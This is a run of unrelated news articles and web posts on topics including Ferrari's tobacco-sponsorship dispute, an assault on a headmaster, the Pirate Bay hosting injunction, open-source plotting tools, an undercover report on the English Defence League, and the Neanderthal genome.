Ferrari took the decision to publish a statement on its website on Thursday night rubbishing the claims and stating it was baffled why its colour scheme was being picked out by doctors .
" Today and in recent weeks , articles have been published relating to the partnership contract between Scuderia Ferrari and Philip Morris International , questioning its legality , " said the Ferrari statement .
" These reports are based on two suppositions : that part of the graphics featured on the Formula 1 cars are reminiscent of the Marlboro logo and even that the red colour which is a traditional feature of our cars is a form of tobacco publicity .
" Neither of these arguments have any scientific basis , as they rely on some alleged studies which have never been published in academic journals .
But more importantly , they do not correspond to the truth .
" The so - called barcode is an integral part of the livery of the car and of all images coordinated by the Scuderia , as can be seen from the fact it is modified every year and , occasionally even during the season .
Furthermore , if it was a case of advertising branding , Philip Morris would have to own a legal copyright on it .
" The partnership between Ferrari and Philip Morris is now only exploited in certain initiatives , such as factory visits , meetings with the drivers , merchandising products , all carried out fully within the laws of the various countries where these activities take place .
There has been no logo or branding on the race cars since 2007 , even in countries where local laws would still have permitted it .
" The premise that simply looking at a red Ferrari can be a more effective means of publicity than a cigarette advertisement seems incredible : how should one assess the choice made by other Formula 1 teams to race a car with a predominantly red livery or to link the image of a driver to a sports car of the same colour ?
Maybe these companies also want to advertise smoking !
" It should be pointed out that red has been the recognised colour for Italian racing cars since the very beginning of motor sport , at the start of the twentieth century : if there is an immediate association to be made , it is with our company rather than with our partner . "

Headmaster savagely beaten by ex-pupil who harboured a 20 - year grudge against him
Vicious attack : Kieran Heakin had to have four metal plates put in his skull
A headmaster has been left deaf and scarred for life by a former pupil who claims he harboured a 20 - year grudge against him .
Kieran Heakin , 58 , suffered horrendous facial injuries when he was attacked in an Indian restaurant .
Former pupil Jermaine Bullen , 26 , approached him and said : ' Do you remember me ?
You beat me when I was six years old and I have been waiting all these years to meet up with you . '
Bullen , a labourer , then launched his attack in the restaurant , punching and kicking the headmaster to the ground .
He bore a grudge against Mr Heakin for two decades after he alleged he was thrashed by the teacher for misbehaving in school .
Yesterday Bullen was jailed for three years after he pleaded guilty to wounding with intent to commit grievous bodily harm .
The attack came during a chance encounter after he spotted Mr Heakin waiting for a takeaway curry at the Kabana in Rochdale , Greater Manchester , with two fellow heads .
Mr Heakin , the headmaster of St John 's RC Primary , in Burnley , suffered a broken nose , a broken cheekbone and ribs , a fractured eye socket and a broken jaw .
His wife Angela , 57 , said her husband was ' unrecognisable ' and admitted she and their children Rebecca , 36 , Damien , 31 , and Edward , 22 , had been left reeling by the unprovoked attack and the extent of his injuries .
The former mayor of Whitworth , near Rochdale , who has taught for 34 years , spent two weeks in hospital and two months recuperating at home .
He had to have four metal plates put into his skull and is now permanently deaf in one ear and has no sense of smell and taste .
Grudge :
The attack has left Mr Heakin , left , deaf .
Jermaine Bullen has been jailed for three years
But Mr Heakin - a committed Christian - strongly denies ever having used corporal punishment .
He said : ' In spite of my injuries I have forgiven Jermaine and I do n't want any revenge .
' He lost his self control for a moment and will pay for that for many years to come .
' I remember him as an infant but I have not seen him for 19 years .
' He was expelled from schools many times .
' I have never beaten a child in my life .
Corporal punishment has been illegal since 1986 and was certainly not used at my school .
I do n't like to dwell on the incident or the after - effects .
As a committed Christian I have decided to forgive him .
That is my job - I spend a lot of time telling children about forgiveness . '
Earlier Bolton Crown Court heard how Bullen confronted Mr Heakin , saying : ' You will remember me and you will remember my father - you used to bully me at school . '
Bullen , who was arrested the following day after fleeing the scene , has a string of offences on his record including affray , GBH and drugs charges .
David Farley , defending , said : ' When the assault was happening , he says all he could do was picture himself at that age and he lost control . '
Major movie studios have won yet another round against The Pirate Bay , this time cutting off one of the site 's chief ISPs , Cyberbunker .
The district court in Hamburg , Germany has issued an injunction against Cyberbunker and its owner , Sven Olaf Kamphuis , demanding that he cut off service to The Pirate Bay .
Failure to do so will result in massive fines of € 250,000 per act of online infringement , or up to two years in prison .
The Motion Picture Association , the international version of the MPAA , requested the injunction and a judge concluded that Cyberbunker did not qualify for the " safe harbors " found in EU law , given that the hosting service had been notified about copyrighted movies listed on The Pirate Bay .
Cyberbunker is run by CB3ROB Data Services , a Berlin company .
The company 's website hosts prominent links to the Dutch and German Pirate Parties , along with " untraceable transit " and " privacy and diplomacy guaranteed . "
" We go forward to defend freedom and all that is good and just in the world , " reads the site .
" The total solution provider in a hostile world ! "
The Pirate Bay has proved elusive , shuffling its servers , ownership , and ISPs around the world in an effort to avoid the studios .
Pirate Bay admin Fredrik Neij works for DCP Networks , a Swedish company that provides " a wide range of proxy services , tunneling services , DNS hosting and colocation , " according to Neij .
DCP has hosted numerous BitTorrent sites over the years and has tremendous experience at keeping them going .
Over the last couple of years , however , the studios have managed to secure the conviction of four key Pirate Bay defendants in a Swedish court , convinced several European judges to censor the site , and obtained injunctions against Pirate Bay hosts .
Despite it all , the site remains accessible , though the MPA promises that " litigation is continuing against other facilitators in Sweden who are hosting trackers . "
A plotting tool is computer software which helps to analyze and visualize data , often of a scientific nature .
Using this type of software , users can generate plots of functions , data and data fits .
Software of this nature typically includes additional functionality , such as data analysis functions including curve fitting .
A good plotting tool is very important for generating professional looking graphics for inclusion in academic papers .
However , plotting tools are not just useful for academics , engineers , and scientists .
Many users will need to plot graphs for other purposes such as presentations .
Fortunately , Linux is well endowed with plotting software .
There are some heavyweight commercial Linux applications which include plotting functionality .
These include MATLAB , Maple , and Mathematica .
Without access to their source code , you have limited understanding of how the software functions , and how to change it .
The license costs are also very expensive .
And we are fervent advocates of open source software .
The purpose of this article is to help promote open source plotting tools that are available .
To provide an insight into the quality of software that is available , we have compiled a list of 14 excellent plotting tools .
Many of the applications are very mature .
For example , gnuplot has been in development since the mid-1980s .
The choice of plotting software may depend on which programming language you prefer .
For example , if your leaning towards Python , matplotlib is an ideal candidate as it ’s written in , and designed specifically for Python .
Whereas , if you ’re keen on the R programming language , you ’ll probably prefer ggplot2 , which is one of the most popular R packages .
With good reason , it offers a powerful model of graphics that removes a lot of the difficulty in making complex multi-players graphics .
R does come with “ base graphics ” which are the traditional plotting functions distributed with R. But gpplot2 takes graphics to the next level .
Hopefully , there will be something of interest for anyone interested in producing high quality graphs .
We highly recommend matplotlib , gnuplot , ggplot2 , and ROOT , but the other 10 applications are all worthy of investigation .
Now , let ’s explore the 14 plotting tools at hand .
For each title we have compiled its own portal page , a full description with an in - depth analysis of its features , a screenshot of the software in action , together with links to relevant resources .
Plotting Tools matplotlib Python based plotting system in a style similar to Matlab gnuplot Command - line driven interactive plotting program ggplot2 Powerful R package for declaratively creating graphics ROOT Solves the data analysis challenges of high - energy physics Veusz Scientific plotting and graphing program PLplot Scientific plotting library Octave Built - in plotting and visualization tools Ctioga Command - line plotting utility DataMelt Produces professional graphics with libraries for data manipulation LabPlot Data plotting and function analysis tool for KDE GLE Graphics Layout Engine SciDAVis Scientific Data Analysis and Visualization RLPlot Generate publication quality graphs Genius Educational tool in mathematics and for research

Join with Christian leaders of all denominations who love God to humble ourselves , pray , seek the face of God , and turn from our wicked ways — individually and as a nation .
This event is not to impress the media or those in Washington , but to reach the heart of God .
Publicly repenting and crying out to God for
His mercy instead of the judgment our many sins deserve .
Repentance in personal and corporate prayer to God and remembrance of His work throughout our nation 's history will be major parts of the day as we seek God to do a great work of revival or reformation in our time .
The tentative plan is to begin the day with an hour of worship and praise .
May Day 2010 was conceived by Religious Right radio host ( and member of Mike Huckabee ’s inner circle ) Janet Porter , who believes that America “ made the choice of death ” in the 2008 election .
This was highly endorsed and publicized in Religious Right circles .
The event is closely tied to the American Family Association , and James Dobson himself of Focus on the Family urged participation :
Our nation faces what is perhaps the most serious moral crisis since the Civil War as we 've turned our backs on God and have clearly displeased him .
May Day 2010 is a time to come together and proclaim what God has done in the past , to pray for forgiveness and to plead for God 's mercy on all of us .
According to Right Wing Watch :
May Day 2010 has been organized around the “ Seven Mountains ” theology , which advocates the complete takeover of every aspect of contemporary culture by modern day “ apostles ” of Christ .
The theology is rooted in the belief that Christians are meant to have dominion over literally everything and is focused on spiritually “ invading ” seven specific facets of modern life in order to wrest control away from Satan and his demonic spirits so that Christians can put them to use in bringing about God ’s kingdom on Earth : ( 1 ) Business ; ( 2 ) Government ; ( 3 ) Media ; ( 4 ) Arts and Entertainment ; ( 5 ) Education ; ( 6 ) Family ; and ( 7 ) Religion .
Well , it looks like “ God ’s kingdom on Earth ” has a long way to go , because based on reports by Truth Wins Out ’s Wayne Besen , only about 300 people showed up .
Can somebody say “ fail ” ?
Just think of what that $ 70,000 could have been used for .
Feeding the hungry , clothing the naked , sheltering the homeless , perhaps ?
You know , things that real Christians do .
Things that Jesus advocated for .
But the Religious Right has never been concerned about those things .
They ’d rather spend $ 70,000 publicly lambasting what grown adults do in their own bedrooms and lamenting over the fact that children in public schools are learning science .
Here ’s a video of Peter Labarbera asking God for forgiveness for our tolerance of teh gay … followed by a video of a series of speakers , one of which asks for forgiveness for America allowing a Muslim to serve in Congress .
( If the second speaker in the second video does n’t make you LOL , I do n’t know what will . )
Editor 's note : Hamid Dabashi is the author of " Iran : A People Interrupted . "
He is the Hagop Kevorkian professor of Iranian studies and comparative literature at Columbia University in New York .
New York ( CNN ) -- Dear Mr. President :
How good of you , sir , to have personally telephoned two New York heroes whose timely diligence prevented a lunatic from causing a catastrophe in Times Square .
We New Yorkers are happy to hear you called Mr. Lance L. Orton Sr. and Mr. Duane Jackson to thank them for their vigilance .
But there is a third vendor , Mr. President , whom you forgot to call .
His name is Alioune B. Niass , and he is an immigrant from Somalia who said he was the first person to notice the smoking Nissan Pathfinder .
" I thought I should call 911 , " Niass later told a reporter , " but my English is not very good and I had no credit left on my phone , so I walked over to Lance , who has the T - shirt stall next to mine , and told him .
He said we should n't call 911 .
Immediately he alerted a police officer nearby . "
Here in New York , Mr. President , we are not particular about which one of these great New Yorkers saw that deadly car first , alerted the police and prevented a disaster .
The Big Apple has a big heart , and the magnificent city of New York has room for plenty of heroes .
But we are also very fair people .
So we would be grateful if you could kindly call Mr. Niass and thank him for us .
There is another reason besides fairness .
Mr. Niass is a Muslim from Somalia , and some of us Muslim - Americans have a suspicion that your staff might not have brought him to your attention because the idea of a Muslim hero in New York does not quite dovetail with the stereotype .
If there is an American of Muslim descent who commits , or tries to commit , a criminal act , as Faisal Shahzad apparently did , we Muslims feel we are all suddenly suspects .
We feel we need to explain ourselves .
Yet if there is a hero among us whose love for our city does not fit the stereotype , he is ignored .
This is not fair , and we believe you , as our president , can do much to alleviate this burden on us and our children .
Imagine millions of Muslim children who go to school across America every day , just like your own children .
Imagine how proud they would feel if you were to call Mr. Niass .
That pride of place , that we and our children deserve , would go a long way to alleviating the pain of the bigotry and racism that is aimed at us .
We too would feel at home here and be even more diligent in safeguarding and protecting our cities from criminal atrocities .
You recall , Mr. President , during your presidential campaign you were , and still are , repeatedly " accused " of being a Muslim -- as if being a Muslim were a crime .
We were hoping every time you denied being a Muslim that you would add , " and if I were a Muslim , there is nothing wrong with it . "
Finally , it was former Secretary of State Colin Powell who came out and said so when answering people who claimed you are Muslim : " He 's a Christian ; has always been a Christian .
But the really right answer is , ' What if he is ?
Is there something wrong with being a Muslim in this country ? ' "
We were relieved and grateful .
We , too , Mr. President , are America .
We have our share of criminals amongst us , as do any other people .
But we are not all terrorists , and we are tired of feeling false guilt or shame every time a criminal among us does something insane and stupid .
We are ordinary people -- soldiers and scientists , scholars and students , homemakers and teachers , businessmen and lawyers , physicians and engineers , greengrocers and vendors .
And you are our president too .
We who claim Mr. Niass as one of our own also have a dream .
We dream that our children will one day live in a nation where they will not be judged by the faith of their forefathers but by the content of their character .
When the Rev. Martin Luther King Jr. -- the visionary who said these immortal words I paraphrase -- uttered that phrase for the first time in 1963 , scarcely anyone could have imagined that you would be our president today .
But now you are and can do your share to change perceptions .
It is possible that a Muslim might become president some day .
For all we know , that president might be an American kid of Afghan , Pakistani , Arab , Iranian , Somali , or Indonesian parentage who is reporting to school this morning .
Imagine how proud she would be if you were to call Mr. Niass today and thank him .
His business is located on the corner of 45th and Broadway , two tables down from Lance's .
I can give you his phone number .
The opinions expressed in this commentary are solely those of Hamid Dabashi .

Oliver went missing from his owner 's home in October An Indian psychic is helping to search for cat which went missing from a Lincolnshire village .
Oliver , a four - year - old tabby and white cat , went missing from Boothby Graffoe in October .
Owner Sue Machen , 56 , has paid £ 1,000 for Hertfordshire - based company Animal Search UK to hunt for the animal .
It has employed psychic Sarita Gupta , who is based in Bangalore , to help in the search , a move which has been criticised by a sceptics ' society .
Ms Gupta believes the cat has been adopted as a stray by a new family , who do not know he has an owner .
Ms Machen said : " The expense [ for the search ] is immaterial .
" I am just desperate to know what has happened to him .
I am hoping he has wandered off and been picked up by someone . "
[ They ] would likely be the suggestions you 'd get from someone without psychic powers
Merseyside Skeptics Society spokesman Tom Watkins , who is leading the search , said : " We have had some good publicity and we are building up a picture of where Oliver might be .
" We are hoping the psychic is right and we will receive a call about where Oliver is .
" That would be mission accomplished if we can achieve that . "
The team said a missing cat in Birmingham had been found in a Wendy house after the same psychic said it would turn up " where children play " .
A spokesman for the Merseyside Skeptics Society said : " Looking at the advice given by the psychic in both cases , we have the suggestion that the cat is staying with another family , and the idea that lost cats like to be near children .
" Both of these are incredibly obvious scenarios to suggest for a missing cat , and would likely be the suggestions you 'd get from someone without psychic powers - and without the need for a fee , too . "

Back in November , I announced the first release of the W3C cheat sheet , a compact , mobile - friendly Web application that allows to look up keywords in various W3C specifications , as well as to access various guidelines and best practices at the tip of the finger .
I am now pleased to announce a new release of the W3C cheat sheet , that features a number of improvements :
a new layout with improved user interactions — thanks to Sorin Stefan for his invaluable help !
the possibility to navigate from one keyword to another ; for instance , in the details of the HTML head element , it is now possible to follow a link to see the details of each of the allowed children of that element , such as title ;
element , it is now possible to follow a link to see the details of each of the allowed children of that element , such as ; integration of more accessibility , internationalization and mobile - friendliness techniques as part of the keywords views ;
an OpenSearch plug - in that allows to use the cheat sheet as part of the browser search bar ;
search results and individual views are now bookmarkable ;
plenty of bug fixes , both in code and data ;
a very early and still pretty rough user documentation
I have also integrated a donate button as part of the “ about ” screen — if you find the tool useful , please consider making use of it since it really helps W3C in maintaining and developing its open source tools set for developers ( including the various validators ) .
And I ’m still very much looking forward to getting new people involved in the project —
I have started drafting some documentation for interested developers in the hope to make that option easier .
Some ideas of possible improvements for the next release :
integration of ( some ? ) HTML5 and CSS3 specifications ;
possibility to add external data sources , keeping only core specs in the base distribution ;
integration of the content of the other tabs in the search results .
In the back room of a sparsely decorated pub in Bolton a man with a shaved head and a tattoo poking out above his shirt collar hands out what look like wraps of cocaine to his friends .
It is just after 11 am but behind him the pub is already packed with young , mainly white , men .
Suddenly it erupts .
" We want our country back .
We want our country back … Muslim bombers off our streets . "
The chants ring out as tables are thumped and plastic pint glasses are thrust into the air .
" It is going to be a good ' un today , " says the shaven - headed man , leaning across the table towards me to make himself heard .
" We 're going to get to twat some Pakis – I can feel it . "
The pub , a few hundred yards from Bolton railway station , is the latest gathering point for the most significant rightwing street movement the UK has seen since the heyday of the National Front in the 1970s .
For the past four months the Guardian has joined English Defence League demonstrations , witnessing its growing popularity , from protests attracting just a few hundred hardcore activists at the end of last year to rallies and marches which are bringing thousands of people on to the street – and into direct conflict with the police and local Muslim communities .
The EDL plans to step up its campaign in coming weeks , culminating in marches through some of the UK 's most high - profile Muslim communities , raising the spectre of widespread unrest .
With the British National party beset by infighting and recriminations after its poor showing in last month 's local and national elections , the UK is facing the prospect of rightwing activists turning away from the ballot box and back to the street for the first time in three decades .
The English Defence League sprang up in Luton last year in reaction to a demonstration by a small extreme Islamist group during a homecoming parade by the Royal Anglian Regiment .
Since then this chaotic organisation – based largely around existing football groups and hooligan networks – has mobilised thousands of people against what it terms " Islamic extremism " .
In telephone conversations and face - to - face meetings , members of the EDL 's secretive leadership team repeatedly told the Guardian that the group is not racist and just wants to " peacefully protest against militant Islam " .
But at each demonstration I attended while making an undercover film for the Guardian 's investigative film unit , Guardian Films , I was confronted by casual – often brutal – racism , a widespread hatred of Muslims and often the threat of violence .
It was only possible to film some of the most alarming scenes with a hidden camera .
Inside a pub in Stoke in January about 3,000 EDL supporters gathered for the first demonstration of the year .
They had spent the past four hours drinking .
The balcony around the top of the cavernous pub was draped in flags bearing the names of different football clubs – Wolves , Newcastle , Aston Villa – and the chants " We all hate Muslims " and " Muslim bombers off our streets " filled the air .
The atmosphere was tense , and not just because of the growing anti-Islamic rhetoric .
The pub was packed with rival football gangs from across the Midlands and the north of England .
Twice , fighting broke out as old rivalries failed to be subdued by the new enemy – Islam .
" They 're just kids , " said one man .
" That is not what we are here for today . "
As we moved outside for the EDL protest – during which supporters became involved in violent clashes with the police – a woman asked me for a donation to support the " heroes coming back injured from Afghanistan " .
I put a pound in the bucket .
" Thanks love , " she said .
" They go over there and fight for this country and then come back to be faced with these Pakis everywhere . "
She paused , before adding : " But to be honest it is the niggers I can't stand . "
This kind of casual racism is not hard to find on EDL demonstrations .
The Guardian has also identified a number of known rightwing extremists who are taking an interest the movement – from convicted football hooligans to members of violent rightwing splinter groups .
The EDL says it is doing what it can to keep them away but acknowledged their influence .
" At previous events , we have had far - right groups like Combat 18 turning up , " the EDL 's self - proclaimed leader , who uses the pseudonym Tommy Robinson , said in a local newspaper interview .
" It 's naive to guarantee no violence . "
Nick Lowles , of the anti-fascist group Searchlight , says these groups have a growing – and dangerous – influence .
" What we are seeing is more organised fringe elements – the National Front , old networks of Combat 18 people and members of the BNP – who are getting involved specifically to try and use the EDL to spark serious disorder , " says Lowles .
" This is a serious development ; we just need one of these demonstrations to go wrong – for there to be a serious incident – and it wo n't just lead to disorder in Dudley , Bolton or wherever , it will spread to towns and cities across the country . "
Strange coalition
But the EDL is not a simple rerun of previous far - right street groups .
On each demonstration there is a smattering of non–white faces and one of the group 's leaders is Guramit Singh , a British - born Sikh .
The organisation 's core support appears to be young white men who are often fuelled by drink and sometimes drugs .
But its Islamophobic message seems to have acted as a lightning rod for a strange coalition – from rightwing Christians who see it as being on the frontline in the " global fight against Islam " to gay rights activists .
At the front of the EDL demonstration in Bolton in March , among the banners decrying Islam , was a man holding up a pink triangle .
He looked nervous when I asked him what he was doing there .
" This is the symbol gay people were made to wear under Hitler , " he said .
" Islam poses the same threat and we are here to express our opposition to that . "
It turns out he is a member of the EDL 's lesbian , gay , bisexual and transgender division , which has 115 members .
Many of the people I met said they had never been involved in rightwing politics before .
" I finished my night shift at 5 am and we got on a coach down from Wigan about six , " says Steve as the Victoria line tube train rattles along towards Pimlico and the EDL's London demonstration a few weeks later .
" Reckon I should be back in time for it to start again at 10 . "
The carriage is packed with around 50 EDL supporters who set off from the north - west that morning .
They launch into one of the EDL 's favourite songs : " There were 10 Muslim bombers in the air . "
Steve explains over the din how his factory is being " overrun by immigrants " .
Like others on EDL demonstrations , he exudes a sense of excitement that " something is happening " .
" We have had enough , no one is taking us seriously … about anything – but they are going to have to listen now . "
But the EDL is not only attracting disaffected working - class men .
On a chilly evening in early March , Alan Lake settles into his seat in a cafe in central London .
This smartly dressed man in his mid-40s has emerged as a key figure in the organisation and is quickly into his stride – warning that the UK will have Sharia law in the next 40 years " unless something is done " .
A London - based IT consultant , Lake has spoken at several EDL rallies and sees himself as one of the organisation 's thinkers .
" The middle - class intellectuals are coming forward and also American speakers – some of them quite famous , although I can't give you names yet … they love the fact that we can have people that can go on the streets . "
Addressing a far - right anti-Islam conference in Sweden last year , Lake told delegates it was necessary to build a united " anti-Jihad movement " and spoke of the need for " people that are ready to go out in the street " , boasting that he and his friends had begun to build alliances with " more physical groups like football fans " .
Lake says he is opposed to violence or confrontation but regularly returns to the importance of the EDL 's physical presence .
" The EDL has a lot of support and is growing quickly and crucially what it has done is deliver an activist movement on the streets , " he tells me subsequently .
Pressed on the levels of violence at the demonstrations , he replies : " These people are not middle - class female teachers … if they continue to be suppressed it will turn nasty in one way or another …
We have put bodies on the street , writing letters to the Times does not work … if we are going to have a mess that is so much grist to the mill . "
Lake says he is exploring a political future for the EDL – and argues it should consider throwing its weight behind the UK Independence party .
He later introduces me to Magnus Nielsen – a Ukip candidate in the general election – who has agreed to speak at forthcoming EDL rallies .
Nielsen describes Muhammad as a " criminal psychopath " , " the first cult leader " and " psychiatrically deranged " .
Lake says there is " some synergy " between the two groups .
A few weeks later Lake tells me that he is no longer an EDL spokesman .
" I am really working on the Ukip thing so we can offer people an alternative , " he says .
A spokesman for Ukip said it would not form any alliance with the EDL or any other " extremist " group .
However , these efforts appear to be part of tentative steps by the EDL to expand its reach beyond its street demonstrations .
In March a delegation of activists travelled to Berlin to take part in an anti-Islam rally in support of far - right anti-immigrant Dutch politician Geert Wilders .
It is also forging tentative links with the US anti-Islam group Stop the Islamification of America , whose New York demonstration was advertised on the EDL website in April .
Growing unrest
The upshot appears to be a movement that , although chaotic and beset by infighting , seems to be growing in scope and sometimes violence .
At a protest in Dudley last month , demonstrators threw missiles at the police before ripping down barriers and rampaging through the town in an attempt to confront anti-racist protesters and local Asian youths .
In Aylesbury a few weeks later they again clashed with police .
And despite the group 's protestations to the contrary , the prospect of serious unrest is growing .
The list of towns the EDL plans to hit this summer is lengthening – Newcastletomorrow , Cardiff , Dudley and Bradford over the next few weeks .
According to Lowles the stakes are high .
" What we are seeing now is the most serious , most dangerous political phenomenon that we have had in Britain for a number of years , " he says .
" With EDL protests that are growing week in , week out there is a chance for major disorder and a political shift to the right . "
But the appeal of the EDL is not just down to the extreme opinions expressed by people such as Lake and Nielsen .
In Stoke a group of teenagers who were on their first EDL demonstration said they had come after reading reports that " the Muslims " were planning to march through Wootton Bassett with 500 coffins .
The proposed march was called by Anjem Choudary and his small extremist group Islam4UK .
The group is reviled by the majority of Muslims and the demonstration did not go ahead .
But this was lost on the outraged teenagers who turned up in Stoke and subsequently travelled to two of the next three EDL events .
Outside the Morpeth Arms on the banks of the Thames in March supporters gathered for the EDL's London demonstration .
One who had travelled down from Blackburn was eager to know who had seen a television documentary that he thought showed how a Muslim group were taking over politics in east London .
The EDL had carried a link to the film on the front of its website and most of the supporters drinking in the sunshine knew about it .
For Matthew Goodwin , an academic who specialises in far - right politics at Manchester University , this is a crucial difference between the EDL and previous far - right street movements .
" The reason why the EDL 's adoption of Islamophobia is particularly significant is that unlike the 1970s , when the National Front was embracing antisemitism , there are now sections of the media and the British establishment that are relatively sympathetic towards Islamophobia , " says Goodwin .
" It is not difficult to look through the media and find quite hostile views towards Islam and Muslims .
That is fundamentally different to the 1970s , when very few newspapers or politicians were endorsing the NF 's antisemitic message . "
" The point for your average voter is that if they see the EDL marching through their streets shouting about how the neighbourhood is about to be swamped by Muslims or how the UK is going to be Islamified by 2040 , they are also receiving these cues from other sections of British society … the message of the EDL may well be legitimised if that continues . "
The people on the sharp end of the EDL 's message echo this view .
Mujibul Islam , chair of the youth committee of the Muslim Council of Britain , says the foundations for the growth of the EDL have been laid not just by extremists but by countless political speeches and newspaper articles .
" It simply would not be acceptable to say the things that are being said on these demonstrations about any other group – black people , Jewish people .
But we are now in a position where it seems almost acceptable to say these things about Muslims . "
He said the growth of the EDL was having a real impact on the way ordinary Muslims were being treated .
" A woman I know got on to a tube train which had a lot of EDL supporters on recently and was really badly abused ; another man was attacked as he made his way home on the train .
These are the consequences of what we are seeing now .
It is not just a theoretical debate about freedom of speech . "
In a recent interview on Fox News , commentator Bill O’Reilly asked Sarah Palin what she would tell an America that “ has , as they say in California , evolved ” to become a “ much more secular nation than we were back in 1776 . ”
Palin responded that we “ should kind of keep this clean , keep it simple , go back to what our founders and our founding documents meant .
They ’re quite clear that we would create law based on the God of the Bible and the Ten Commandments .
It ’s pretty simple . ”
Much has been written about the extent to which religion , especially Christianity , influenced the founding fathers and the documents they created .
But the even larger debate on the relation of the Many and the One — the Pluribus and the Unum — of America is more in the province of philosophers .
What do they tell us ?
Palin cited the national motto —
In God We Trust — as an indication of how strongly “ we do base our lives , our values , on the God of the Bible . ”
She would be perfectly comfortable on the Texas State Board of Education , where social conservatives have likewise emphasized the importance of In God We Trust and promoted a tilt toward the “ One ” in E Pluribus Unum : Latin for “ Out of the Many , One . ”
There is no doubt that their One is the biblical God .
One of the best - known American philosophers is William James , author of Pragmatism , Varieties of Religious Experience , and A Pluralistic Universe , among others .
Because of his work ( and that of Charles Sanders Peirce and John Dewey ) , pragmatism is the philosophy most often associated with America .
In Pragmatism , James wrote that to some people , ideas are true whenever they conform to “ what God means we ought to think . ”
As Palin made ( more or less ) clear , the God whose ideas “ we ought to think ” — the God in whom we should trust , to use the more familiar phrasing — is the God described in the Bible .
James wrote that for such people “ … truth means essentially an inert static relation .
When you ’ve got your true idea of anything , there ’s an end of the matter . ”
But is the One , the Unum , the God set forth in the Bible and the Ten Commandments ?
Or is the One the aggregation of American experience — religious , political , good , bad , ambiguous — to which we as individuals ( the Many ) stand in relation ?
Recall that James wrote of “ an inert static relation . ”
It was no accident that he did so , for the pragmatists , other pluralists , and process philosophers all tell us that the One is not literally monistic , but rather is all that has come before , all that is our past , and we are connected to it by dynamic relation .
For the pragmatists , what is “ true ” from that aggregation of experience is that which “ works , ” and is useful when set against our present , helping us to make sense of our lives as we move into the future .
It remains true so long as it works .
There is arguably nothing more American — not religious impulse , not political principle — than our belief in what works in our actual lives .
This commitment to history or , more accurately , to experience , is not necessarily antithetical to theistic beliefs , Christian or otherwise .
Influenced to some extent by William James , but more systematic and precise in his philosophy , Alfred North Whitehead ( most notably in Process and Reality ) conceived of a God who is part product - of - all - actual - experience and part repository - for - all - possible - experience .
This God stands in relation to individuals , the Many , who in “ drops of experience ” ( a term used by both James and Whitehead ) interact with the One in the present .
The essential element in this relation is that God , the One , in its contingent sense , is a participant in these drops of experience , and , more profoundly , is changed by them in a continual process .
Therefore , the One relies on a communion with the Many for its own definition , and ultimately , for its own completion .
In the case of Palin and the God of the social conservatives , this means that their attempts to promote a static
One and expect that the Many will or should accede to it are not only contrary to reality but also in some ways un-American , given that most Americans embrace what actually works in the changing world of experience .

The BCC says there needs to be easier access to capital
Comparing your income with those of family and friends is a recipe for unhappiness , a study has suggested .
Researchers analysing data from a Europe - wide survey found three - quarters of those asked thought it important to compare their incomes with others .
But those who compared salaries seem less content , especially if they looked at those of friends and family rather than work colleagues .
The paper in the Economic Journal also found the poor were most affected .
The researchers , from the Paris School of Economics , used data from the European Social Survey covering 19,000 participants in 24 countries .
They found that those who compared their incomes with others tended to be less happy .
We need to know what comes first - is it those who are glass half empty types who do the comparisons as a consequence of that , or is it the comparison that makes them unhappy ?
Professor Cary Cooper , Lancaster University Management School
The responses showed that the greater the importance people attached to such comparisons , the lower they ranked themselves on measures of satisfaction with life and standard of living , as well as on feeling depressed .
There was no difference seen between men and women in how much they compare their income with those around them .
But limiting comparisons to work colleagues seems to be the most innocuous - as comparisons with friends appeared to be twice as painful as comparisons with colleagues .
People in poorer countries were found to compare their incomes more than people in richer ones and , within countries , poorer people were more likely to compare their incomes than richer people .
Glass half empty
The researchers suggest that when it comes to comparing your salary with colleagues ' earnings , it may help boost feelings about the prospects for potential future income .
They concluded : " Constantly looking over one 's shoulder seems to make the world a less happy - and more unequal - place . "
Study leader Professor Andrew Clark added that the larger effect seen in poorer groups was a surprise .
" I had thought that richer people would compare more because if you 're down towards the bottom what really matters is just getting the minimum required , but it did n't come out that way . "
Professor Cary Cooper , an expert in organisational psychology and health at Lancaster University Management School , said the kind of people who constantly compare themselves with others tend to be unsure of themselves .
" We need to know what comes first - is it those who are glass half empty types who do the comparisons as a consequence of that , or is it the comparison that makes them unhappy ? "
He said comparisons with school and university friends were probably most damaging .
" With work colleagues it 's a fairness issue , but with school friends who had the same opportunities as you you might think ' They 've done much better than me so I must be less competent ' .
" I would advise people to not compare themselves and be happy with who they are and the situation they 're in - remember those you 're comparing yourself with may not actually be more content . "

Migrating humans interbred with Neanderthals after leaving Africa .
Some Neanderthal lives on in the genomes of many modern humans .
M. ANTON / SCIENCE PHOTO LIBRARY
The genomes of most modern humans are 1 –4 % Neanderthal — a result of interbreeding with the close relatives that went extinct 30,000 years ago , according to work by an international group of researchers .
The team , led by Svante Pääbo , a geneticist at the Max Planck Institute for Evolutionary Anthropology in Leipzig , is reporting only 60 % of the Neanderthal genome .
But sequencing even this much of the genome was thought to be impossible just a decade ago .
" This will change our view of humanity , " says John Hardy , a neuroscientist at University College London who was not involved in the research but studies genetic neurodegenerative diseases .
The drive to sequence the complete Neanderthal genome began about five years ago following the invention of better , faster methods for sequencing DNA .
From three Neanderthal bones found in Vindija Cave in Croatia , the team extracted a total of about 300 milligrams of bone .
The bones date to between 38,300 and 44,400 years ago , and some have been broken open possibly to remove their marrow — a sign of cannibalism .
Countless fragments of degraded ancient DNA were extracted from the bones , used to create libraries of sequences and then reassembled by computer into the draft Neanderthal genome comprising nearly 2 billion base - pairs .
The researchers used the genomes of modern humans and the chimpanzee as references to get the sequence in the correct order .
They publish their work in Science this week1 .
Quality control
After the Pääbo group published an analysis of 1 million base - pairs of Neanderthal DNA in 20062 , it was found that the sequence was contaminated with modern human DNA .
A separate analysis put the level of contamination at nearly 80%3 , whereas Pääbo and his colleagues contend that it was 11 – 40 % contaminated1 .
Based on that experience , Pääbo and his team developed methods for tagging the multitude of ancient sequence strands , which allowed them to reduce contamination to 0.6 % in this study .
Most of the Neanderthal DNA sequenced was from three bones found in Vindija cave , Croatia .
Max - Planck - Institute EVA
But the fact that the team has so far read the draft genome only 1.3 times on average raises questions about the reliability of the code , which can be altered by degradation or sequencing processes .
For instance , the first ancient genome of a 4,000 - year - old palaeo - Eskimo from Greenland was read 20 times4 .
However , study author Richard Green , who recently moved from the Max Planck Institute to the University of California , Santa Cruz , says that work will continue until the genome has been sequenced an average of 10 – 20 times .
Sergio Baranzini , a geneticist at the University of California in San Francisco who was not involved in the research , says that the low number of sequence reads makes the Neanderthal genome " of limited value " .
Nonetheless , he adds , " it is a fascinating study " .
After Africa
